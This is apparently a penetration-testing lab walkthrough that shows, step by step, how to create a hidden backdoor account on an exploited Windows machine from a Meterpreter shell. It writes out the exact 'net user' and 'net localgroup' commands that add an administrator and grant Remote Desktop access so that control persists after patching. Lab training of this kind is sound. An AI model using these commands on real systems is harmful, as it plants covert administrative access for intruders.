
grep and somemore grep enjoy :) 

Create a Backdoor User

After the exploitation of Windows (or any other system), the easiest method to gain access to it is by creating a user, which can be used as and when required. For example, you can use this account to access the system using Remote Desktop. There will be instances that the vulnerabilities that you exploited are now patched and closed. If you do not have a backdoor user, you will need to find a way to exploit the system again. With the user in existence, your life becomes easier.

In this task, you will create a backdoor user. To do this, perform the following steps:
Step 1

Ensure that you are connected to PLABKALI01, and Meterpreter session is open.

Press Ctrl + l to clear the screen.

You need to first open a shell to access the Windows command prompt. To do this, type the following command:

shell

Press Enter
Figure 1.17 Screenshot of PLABKALI01
Figure 1.17 Screenshot of PLABKALI01: Entering the shell command at the meterpreter prompt.

Step 2

The output of the shell command is displayed.
Figure 1.18 Screenshot of PLABKALI01
Figure 1.18 Screenshot of PLABKALI01: Showing the output of the shell command.

Step 3

You have access to the Windows command shell. You need to now create a user named plab. Type the following command:

net user plab Passw0rd /add

Press Enter
Figure 1.19 Screenshot of PLABKALI01
Figure 1.19 Screenshot of PLABKALI01: Entering the net user command to add a user named plab.

Step 4

The plab user is now created on PLABWIN810 system, which you have exploited.

Figure 1.20 Screenshot of PLABKALI01
Figure 1.20 Screenshot of PLABKALI01: Showing a new user added as the output of the net user command.

Step 5

You would want to retain the administrative control on the system. Therefore, it is wise to add the plab user to the local Administrators group. To do this, type the following command:

net localgroup administrators plab /add

Press Enter
Figure 1.21 Screenshot of PLABKALI01
Figure 1.21 Screenshot of PLABKALI01: Entering the command to add the plab user to the local administrators group.

Step 6

The plab user is now added to the Administrators group.

Figure 1.22 Screenshot of PLABKALI01
Figure 1.22 Screenshot of PLABKALI01: Showing the output of the net user command as user added to the local administrators group.

Step 7

For the plab user to log in to the system using Remote Desktop, you need to add it to the Remote Desktop Users group on the Windows system. To do this, type the following command:

net localgroup "Remote Desktop Users" plab /add

Press Enter.

Figure 1.23 Screenshot of PLABKALI01
Figure 1.23 Screenshot of PLABKALI01: Entering the net user command to add the plab user to the Remote Desktop Users group.

Step 8

The user plab is now added to the Remote Desktop Users group.

Figure 1.24 Screenshot of PLABKALI01
Figure 1.24 Screenshot of PLABKALI01: Showing the output of the net user command with the user added to the Remote Desktop Users group.

Keep the terminal window open.
